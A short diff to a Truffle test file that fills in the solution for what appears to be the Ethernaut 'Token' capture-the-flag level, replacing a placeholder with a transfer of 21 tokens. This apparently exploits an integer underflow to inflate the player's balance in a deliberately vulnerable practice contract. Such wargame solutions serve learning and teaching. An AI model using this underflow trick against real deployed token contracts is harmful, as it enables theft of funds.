@@ -16,7 +16,9 @@ contract('Token', function ([player]) {
   it('should submit level instance successfully', async function () {
     const instance = await utils.createLevelInstance(ethernaut, level.address, player, Token)
 
-    // INSERT YOUR SOLUTION HERE
+    await instance.transfer(instance.address, 21, {
+      from: player,
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
